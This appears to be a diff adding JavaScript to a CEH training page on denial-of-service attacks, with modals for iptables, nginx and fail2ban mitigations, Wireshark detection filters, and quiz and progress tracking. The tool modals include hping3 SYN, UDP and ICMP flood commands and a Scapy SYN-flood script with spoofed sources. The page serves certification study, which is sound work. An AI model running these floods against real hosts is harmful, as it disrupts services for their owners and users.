+function showMitigationExample(type) {
+            let content = '';
+            
+            switch(type) {
+                case 'iptables':
+                    content = `
+                        <h3>🛡️ iptables-based DDoS Protection</h3>
+                        <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 15px 0;">
+                            <h4>Rate Limiting Rules</h4>
+                            <div style="font-family: monospace; background: #2c3e50; color: #ecf0f1; padding: 15px; border-radius: 5px;">
+# Limit connections per IP<br>
+iptables -A INPUT -p tcp --dport 80 -m connlimit --connlimit-above 25 -j REJECT<br>
+<br>
+# Rate limit SYN packets<br>
+iptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT<br>
+iptables -A INPUT -p tcp --syn -j DROP<br>
+<br>
+# Limit ICMP packets<br>
+iptables -A INPUT -p icmp -m limit --limit 1/s --limit-burst 1 -j ACCEPT<br>
+iptables -A INPUT -p icmp -j DROP<br>
+<br>
+# Block known attack sources<br>
+iptables -A INPUT -s 192.168.1.100 -j DROP
+                            </div>
+                        </div>
+                    `;
+                    break;
+                    
+                case 'nginx':
+                    content = `
+                        <h3>🛡️ Nginx DDoS Protection Configuration</h3>
+                        <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 15px 0;">
+                            <h4>Rate Limiting and Security Headers</h4>
+                            <div style="font-family: monospace; background: #2c3e50; color: #ecf0f1; padding: 15px; border-radius: 5px;">
+# Rate limiting configuration<br>
+http {<br>
+&nbsp;&nbsp;&nbsp;&nbsp;limit_req_zone $binary_remote_addr zone=dos_protection:10m rate=10r/s;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;limit_conn_zone $binary_remote_addr zone=conn_limit_per_ip:10m;<br>
+}<br>
+<br>
+server {<br>
+&nbsp;&nbsp;&nbsp;&nbsp;# Apply rate limits<br>
+&nbsp;&nbsp;&nbsp;&nbsp;limit_req zone=dos_protection burst=20 nodelay;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;limit_conn conn_limit_per_ip 10;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;# Connection timeouts<br>
+&nbsp;&nbsp;&nbsp;&nbsp;client_body_timeout 10s;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;client_header_timeout 10s;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;keepalive_timeout 5 5;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;send_timeout 10s;<br>
+}
+                            </div>
+                        </div>
+                    `;
+                    break;
+                    
+                case 'fail2ban':
+                    content = `
+                        <h3>🛡️ Fail2ban Automated Banning</h3>
+                        <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 15px 0;">
+                            <h4>Automatic IP Blocking Configuration</h4>
+                            <div style="font-family: monospace; background: #2c3e50; color: #ecf0f1; padding: 15px; border-radius: 5px;">
+# /etc/fail2ban/jail.local<br>
+[DEFAULT]<br>
+bantime = 3600<br>
+findtime = 600<br>
+maxretry = 3<br>
+<br>
+[nginx-req-limit]<br>
+enabled = true<br>
+filter = nginx-req-limit<br>
+action = iptables-multiport[name=ReqLimit, port="http,https", protocol=tcp]<br>
+logpath = /var/log/nginx/error.log<br>
+findtime = 600<br>
+bantime = 7200<br>
+maxretry = 10<br>
+<br>
+# Filter configuration<br>
+# /etc/fail2ban/filter.d/nginx-req-limit.conf<br>
+[Definition]<br>
+failregex = limiting requests, excess: .* by zone .*, client: &lt;HOST&gt;
+                            </div>
+                        </div>
+                    `;
+                    break;
+            }
+            
+            showModal('Mitigation Example', content);
+        }
+function showToolDetails(tool) {
+            let content = '';
+            
+            switch(tool) {
+                case 'hping3':
+                    content = `
+                        <h3>🔨 hping3 - Advanced Packet Generator</h3>
+                        <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 15px 0;">
+                            <h4>Key Features</h4>
+                            <ul>
+                                <li>TCP/UDP/ICMP packet generation</li>
+                                <li>Advanced header manipulation</li>
+                                <li>Traceroute with different protocols</li>
+                                <li>Port scanning capabilities</li>
+                                <li>Firewall testing and bypassing</li>
+                            </ul>
+                            
+                            <h4>Common Usage Examples</h4>
+                            <div style="font-family: monospace; background: #2c3e50; color: #ecf0f1; padding: 15px; border-radius: 5px;">
+# Basic SYN scan<br>
+hping3 -S -p 80 target.com<br>
+<br>
+# TCP flood with random source<br>
+hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source target.com<br>
+<br>
+# UDP flood<br>
+hping3 -2 -c 1000 -d 120 -p 53 --flood target.com<br>
+<br>
+# ICMP flood<br>
+hping3 -1 --flood target.com<br>
+<br>
+# Traceroute using TCP<br>
+hping3 -T -p 80 target.com
+                            </div>
+                            
+                            <div style="background: #fff3cd; border: 1px solid #ffeaa7; padding: 10px; border-radius: 5px; margin-top: 15px;">
+                                <strong>⚠️ Legal Warning:</strong> Only use hping3 on networks you own or have explicit permission to test.
+                            </div>
+                        </div>
+                    `;
+                    break;
+                    
+                case 'scapy':
+                    content = `
+                        <h3>🐍 Scapy - Packet Manipulation Library</h3>
+                        <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 15px 0;">
+                            <h4>Python-Based Network Analysis</h4>
+                            <ul>
+                                <li>Interactive packet manipulation</li>
+                                <li>Protocol decoding and encoding</li>
+                                <li>Custom packet crafting</li>
+                                <li>Network reconnaissance</li>
+                                <li>Automated attack scripting</li>
+                            </ul>
+                            
+                            <h4>Sample Attack Scripts</h4>
+                            <div style="font-family: monospace; background: #2c3e50; color: #ecf0f1; padding: 15px; border-radius: 5px;">
+from scapy.all import *<br>
+import random<br>
+<br>
+# SYN flood function<br>
+def syn_flood(target, port, count):<br>
+&nbsp;&nbsp;&nbsp;&nbsp;for i in range(count):<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;src_ip = ".".join([str(random.randint(1,254)) for _ in range(4)])<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;packet = IP(src=src_ip, dst=target) / TCP(dport=port, flags="S")<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;send(packet, verbose=0)<br>
+<br>
+# ICMP flood<br>
+def icmp_flood(target, count):<br>
+&nbsp;&nbsp;&nbsp;&nbsp;packet = IP(dst=target) / ICMP()<br>
+&nbsp;&nbsp;&nbsp;&nbsp;send(packet * count, verbose=0)<br>
+<br>
+# Usage (authorized testing only)<br>
+syn_flood("192.168.1.100", 80, 1000)
+                            </div>
+                        </div>
+                    `;
+                    break;
+                    
+                case 'wireshark':
+                    content = `
+                        <h3>🦈 Wireshark - Network Traffic Analysis</h3>
+                        <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 15px 0;">
+                            <h4>DDoS Detection with Wireshark</h4>
+                            <ul>
+                                <li>Real-time packet capture and analysis</li>
+                                <li>Protocol decoding and filtering</li>
+                                <li>Statistical analysis capabilities</li>
+                                <li>Flow analysis and reconstruction</li>
+                                <li>Expert analysis system</li>
+                            </ul>
+                            
+                            <h4>Useful Display Filters for DDoS Analysis</h4>
+                            <div style="font-family: monospace; background: #2c3e50; color: #ecf0f1; padding: 15px; border-radius: 5px;">
+# SYN flood detection<br>
+tcp.flags.syn == 1 and tcp.flags.ack == 0<br>
+<br>
+# ICMP flood analysis<br>
+icmp and icmp.type == 8<br>
+<br>
+# UDP flood to specific port<br>
+udp.dstport == 53<br>
+<br>
+# High volume from single source<br>
+ip.src == 192.168.1.100<br>
+<br>
+# Fragmented packets (potential attack)<br>
+ip.flags.mf == 1 or ip.frag_offset > 0<br>
+<br>
+# Conversations analysis<br>
+# Statistics > Conversations > IPv4
+                            </div>
+                            
+                            <h4>Analysis Techniques</h4>
+                            <ul>
+                                <li><strong>Conversation Analysis:</strong> Identify top talkers</li>
+                                <li><strong>Protocol Hierarchy:</strong> Analyze traffic distribution</li>
+                                <li><strong>I/O Graphs:</strong> Visualize traffic patterns over time</li>
+                                <li><strong>Expert Info:</strong> Identify protocol anomalies</li>
+                            </ul>
+                        </div>
+                    `;
+                    break;
+            }
+            
+            showModal('Tool Details', content);
+        }
+
+        // Add event listeners for interactive elements
+        document.addEventListener('DOMContentLoaded', function() {
+            // Add click handlers for attack cards to show details
+            document.querySelectorAll('.attack-card').forEach(card => {
+                card.style.cursor = 'pointer';
+                card.addEventListener('click', function() {
+                    const title = this.querySelector('h4').textContent;
+                    const content = this.innerHTML;
+                    showModal(title, `<div style="max-height: 60vh; overflow-y: auto;">${content}</div>`);
+                });
+            });
+        });
+
+        // Study time tracker
+        
+function displayStudyTime() {
+            const minutes = calculateStudyTime();
+            const hours = Math.floor(minutes / 60);
+            const remainingMinutes = minutes % 60;
+            
+            if (hours > 0) {
+                return `${hours}h ${remainingMinutes}m`;
+            } else {
+                return `${remainingMinutes}m`;
+            }
+        }
+
+        // Performance analytics
+        
+function trackLearningAnalytics() {
+            const analytics = {
+                totalSections: sectionOrder.length,
+                completedSections: completedSections.size,
+                currentSection: currentSection,
+                studyTime: displayStudyTime(),
+                quizScore: quizScore,
+                completionRate: Math.round((completedSections.size / sectionOrder.length) * 100)
+            };
+            
+            return analytics;
+        }
+
+        // Export study progress
+        
+function exportProgress() {
+            const progress = trackLearningAnalytics();
+            const dataStr = JSON.stringify(progress, null, 2);
+            const dataBlob = new Blob([dataStr], {type: 'application/json'});
+            const url = URL.createObjectURL(dataBlob);
+            const link = document.createElement('a');
+            link.href = url;
+            link.download = `CEH_Module10_Progress_${new Date().toISOString().split('T')[0]}.json`;
+            link.click();
+        }
+
+        // Print study guide
+        
+function printStudyGuide() {
+            window.print();
+        }
+
+        // Additional interactive features can be added here as needed
+    
+
+  /* ---- Render the quiz on load ----
+     Module 10's generateQuiz() populates #quizContainer, but the legacy build
+     called it from inside its old showSection() when the quiz tab was opened.
+     The chassis owns showSection now, so we render once on load via the
+     moduleReady hook (same fix as Module 6). */
+  function moduleReady() {
+    if (typeof generateQuiz === 'function' &&
+        document.getElementById('quizContainer')) {
+      try { generateQuiz(); } catch (e) { console.error('[M10] quiz render failed:', e); }
+    }
+  }
+
+  /* ---- wire it to the chassis ---- */
+  CEH.register({
+      calculateStudyTime: calculateStudyTime,
+      displayResults: displayResults,
+      displayStudyTime: displayStudyTime,
+      exportProgress: exportProgress,
+      generateQuiz: generateQuiz,
+      handleKeyPress: handleKeyPress,
+      loadProgress: loadProgress,
+      moduleReady: moduleReady,
+      printStudyGuide: printStudyGuide,
+      resetQuiz: resetQuiz,
+      showAttackDemo: showAttackDemo,
+      showMitigationExample: showMitigationExample,
+      showToolDetails: showToolDetails,
+      submitQuiz: submitQuiz,
+      trackLearningAnalytics: trackLearningAnalytics
+  });
+
+  CEH.init({ sections: ["overview", "dos-concepts", "attack-types", "botnets", "tools", "detection", "countermeasures", "case-studies", "quiz", "resources"], onReady: moduleReady });
+})();
+</script>
+</body>
+</html>
